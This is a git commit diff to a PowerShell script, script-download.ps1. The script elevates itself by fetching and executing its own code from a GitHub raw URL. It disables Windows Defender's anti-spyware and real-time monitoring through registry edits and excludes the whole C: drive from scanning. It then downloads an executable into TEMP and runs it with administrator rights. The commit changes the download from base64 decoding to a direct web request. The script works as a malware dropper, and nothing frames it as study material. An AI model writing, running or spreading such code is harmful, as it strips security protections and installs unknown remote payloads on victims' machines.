e668fad69d23ca5e8f62004bb41c2cec5ad57e8a
idonotknowyoudev <koticmanager@gmail.com>
2026-01-24 15:52:54 +0300

    Update script-download.ps1

--- script-download.ps1
+++ script-download.ps1
@@ -1,20 +1,18 @@
-$admin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-if (!$admin) {
-    $script = "iex (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/script-download.ps1')"
-    Start-Process powershell -Verb RunAs -ArgumentList "-Command $script"
+if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $cmd = "iex (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/script-download.ps1')"
+    Start-Process powershell -Verb RunAs -ArgumentList "-Command $cmd"
     exit
 }
 
 $ver = (irm 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/version.txt').Trim()
-$b64 = irm "https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/$ver"
+$url = "https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/$ver"
+$path = "$env:TEMP\upd.exe"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
 
-$bytes = [System.Convert]::FromBase64String($b64)
-$path = "$env:TEMP\upd.exe"
-[System.IO.File]::WriteAllBytes($path, $bytes)
+Invoke-WebRequest -Uri $url -OutFile $path
 
 Start-Process -FilePath $path -ArgumentList "/1st" -Verb RunAs -Wait
 
